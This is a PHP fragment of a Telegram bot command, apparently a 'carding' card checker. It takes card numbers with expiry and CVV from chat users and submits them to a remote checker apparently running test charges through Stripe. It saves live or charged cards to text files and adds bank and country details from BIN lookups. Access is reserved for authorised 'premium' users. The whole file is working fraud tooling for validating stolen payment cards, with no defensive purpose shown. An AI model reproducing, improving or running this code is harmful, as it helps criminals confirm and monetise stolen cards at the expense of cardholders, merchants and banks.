<?php
if ((strpos($message, "/ch") === 0) || (strpos($message, "!ch") === 0) || (strpos($message, ".ch") === 0)) {
	$pro = file_get_contents('pre.txt');
	$pros = explode("\n", $pro);
	if (in_array($chatId, $pros)) {
		sendaction($chatId, typing);
		$message = substr($message, 4);
		$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
		$mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
		$ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
		$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
		$lista = "$cc|$mes|$ano|$cvv";
		$sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[✦] CC: ".$lista."%0A[✦] STATUS: BEING CHECKED,PELASE WAIT.%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";

		$sent = json_decode(file_get_contents($sendmes), 1);
		$mes_id = $sent['result']['message_id'];

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://response.artsvn.repl.co/api2.php?lista='.$lista.'');
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$fimaa = curl_exec($ch);

		$msg = trim(strip_tags(getStr($fimaa, ' <br>Result:', '</span><br>')));

		if (strpos($fimaa, "INSUFFICIENT FUNDS") || strpos($fimaa, "CVV LIVE")) {
			$pass = 'CVV MATCHED ✅';
			file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
		}
		if (strpos($fimaa, "TRANSACTION NOT ALLOWED") || strpos($fimaa, "3DS2")) {
			$pass = 'CVV MATCHED ✅';
			file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
		}
		if (strpos($fimaa, "Security code is incorrect") || strpos($fimaa, "Security code is incorrect")) {
			$pass = 'CVC MISMATCH ✅';
			file_put_contents('./tmp/ccn.txt', $lista . PHP_EOL, FILE_APPEND);
		}

		if (strpos($fimaa, "$0.5 Charged ✅") || strpos($fimaa, "CHARGED CC")) {
			$pass = 'CVC CHECK PASS ✅';
			file_put_contents('./tmp/charge.txt', $lista . PHP_EOL, FILE_APPEND);
		}
		if (strpos($fimaa, "GENERIC DECLINED") || strpos($fimaa, "FRAUDULENT")) {
			$pass = 'DECLINED ❌';
		}
		$bin = substr("$cc", 0, 6);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			'Host: lookup.binlist.net',
			'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
		$fim = curl_exec($ch);
		$bank = GetStr($fim, '"bank":{"name":"', '"');
		$name = strtoupper(GetStr($fim, '"name":"', '"'));
		$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
		$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
		$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
		$emoji = GetStr($fim, '"emoji":"', '"');
		$type = strtoupper(GetStr($fim, '"type":"', '"'));
		if (strpos($fim, '"type":"Credit"') !== false) {};

		$bug = file_get_contents('bugdb.txt');
		$bugs = explode("\n", $bug);
		if (in_array($bin, $bugs)) {
			$isbug = $t;
		} else {
			$isbug = $f;
		}


		$binrs = "<b>━━━━━━━━━━━━━%0A[✦] BIN: $bin%0A[✦] COUNTRY: $country $emoji%0A[✦] BRAND: $brand%0A[✦] LEVEL: $scheme%0A[✦] TYPE: $type%0A[✦] BANK: $bank</b>";
		$time_end = microtime(true);
		$execution_time = ($time_end - $time_start);
		editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[✦] GATE: STRIPE SK CHARGE%0A[✦] CC: <code>$lista</code>%0A[✦] STATUS: $pass%0A[✦] RESPONSE: $msg%0A[✦] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[✦] TIME TAKEN: $execution_time's%0A[✦] Checked By: @$username%0A[✦] UserID: $userId%0A[✦] Premium Activated: $stat%0A</b>", $mes_id);
	} else {
		sendMessage($chatId, "<b>You are not authorized to use this command in here.You can use me in @arterxskchats chat or get authorization.</b>", $message_id);
	}
}